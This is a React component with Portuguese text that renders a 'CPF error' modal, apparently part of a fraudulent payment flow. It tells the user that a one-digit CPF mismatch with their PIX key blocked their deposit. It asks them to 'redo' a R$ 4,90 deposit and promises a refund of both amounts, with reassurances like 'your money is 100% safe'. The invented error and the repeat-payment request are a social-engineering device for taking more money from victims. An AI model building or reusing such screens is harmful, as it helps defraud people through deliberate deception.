import React from 'react';
import { CheckCircle, Shield, ChevronRight, RefreshCw, Lock } from 'lucide-react';

interface DataMismatchModalProps {
  isOpen: boolean;
  onReviewData: () => void;
  depositAmount: number;
}

export const DataMismatchModal: React.FC<DataMismatchModalProps> = ({
  isOpen,
  onReviewData,
  depositAmount
}) => {
  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/90 backdrop-blur-sm flex items-center justify-center p-3 z-[70]">
      <div className="bg-white rounded-xl w-full max-w-xs shadow-xl overflow-hidden animate-scale-in">

        {/* Header */}
        <div className="bg-gradient-to-br from-blue-500 to-blue-600 p-4 text-center">
          <div className="w-10 h-10 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-1.5">
            <Shield className="w-5 h-5 text-white" />
          </div>
          <h2 className="text-base font-bold text-white mb-0.5">Erro no CPF</h2>
          <p className="text-white/90 text-xs">1 dígito incorreto</p>
        </div>

        <div className="p-4">

          {/* Valor Seguro */}
          <div className="bg-green-50 border border-green-300 rounded-lg p-3 mb-3">
            <div className="flex items-center justify-center gap-2 mb-2">
              <div className="w-7 h-7 bg-green-500 rounded-full flex items-center justify-center">
                <CheckCircle className="w-4 h-4 text-white" />
              </div>
              <div className="text-center">
                <div className="text-xl font-bold text-green-700">
                  R$ {depositAmount.toFixed(2).replace('.', ',')}
                </div>
                <p className="text-green-600 text-[10px] font-bold">
                  DEPÓSITO SEGURO
                </p>
              </div>
            </div>

            <div className="bg-white rounded-md p-2 border border-green-300">
              <p className="text-green-800 text-xs leading-tight font-medium text-center">
                Seu dinheiro está 100% seguro e será devolvido.
              </p>
            </div>
          </div>

          {/* Problema */}
          <div className="bg-blue-50 rounded-lg p-2.5 mb-3 border border-blue-200">
            <div className="flex items-start gap-2">
              <div className="w-5 h-5 bg-blue-500 rounded-full flex items-center justify-center text-white text-[10px] font-bold mt-0.5">!</div>
              <div className="text-xs">
                <h4 className="text-blue-900 font-bold text-xs mb-1">O que houve?</h4>
                <p className="text-blue-800 leading-tight mb-1">
                  <b>1 dígito do CPF</b> está diferente do titular da chave PIX.
                </p>
                <p className="text-blue-700 leading-tight">
                  É um erro simples de digitação.
                </p>
              </div>
            </div>
          </div>

          {/* Solução */}
          <div className="bg-gradient-to-r from-green-50 to-emerald-50 rounded-lg p-3 mb-3 border border-green-300">
            <div className="flex items-start gap-2 mb-2.5">
              <RefreshCw className="w-4 h-4 text-green-600 mt-0.5" />
              <div>
                <h4 className="text-green-900 font-bold text-xs mb-1.5">Solução rápida (2 min)</h4>

                <div className="space-y-1.5 text-xs">
                  <div className="flex items-start gap-1.5">
                    <span className="text-green-600 font-bold text-[11px] mt-0.5">1.</span>
                    <p className="text-green-800 leading-tight">Corrija o CPF</p>
                  </div>

                  <div className="flex items-start gap-1.5">
                    <span className="text-green-600 font-bold text-[11px] mt-0.5">2.</span>
                    <p className="text-green-800 leading-tight">Refaça depósito de R$ 4,90</p>
                  </div>

                  <div className="flex items-start gap-1.5">
                    <span className="text-green-600 font-bold text-[11px] mt-0.5">3.</span>
                    <p className="text-green-800 leading-tight">
                      <b>Receba R$ {depositAmount.toFixed(2).replace('.', ',')} + R$ 4,90</b> (R$ {(depositAmount + 4.9).toFixed(2).replace('.', ',')})
                    </p>
                  </div>
                </div>
              </div>
            </div>

            <div className="bg-white rounded-md p-1.5 border border-green-300 flex items-center justify-center gap-1">
              <Lock className="w-3 h-3 text-green-600" />
              <p className="text-green-800 text-[10px] font-bold">
                Você não perdeu nada!
              </p>
            </div>
          </div>

          {/* CTA */}
          <button
            onClick={onReviewData}
            className="w-full bg-gradient-to-r from-green-500 to-emerald-600 text-white font-bold py-3 rounded-lg hover:from-green-600 hover:to-emerald-700 active:scale-95 transition-all duration-300 shadow-md mb-1.5"
            style={{ touchAction: 'manipulation' }}
          >
            <div className="flex items-center justify-center gap-1.5">
              <span className="text-sm">CORRIGIR CPF AGORA</span>
              <ChevronRight className="w-4 h-4" />
            </div>
          </button>

          <p className="text-center text-green-700 text-[10px] font-medium">
            Processo 100% seguro
          </p>
        </div>
      </div>
    </div>
  );
};
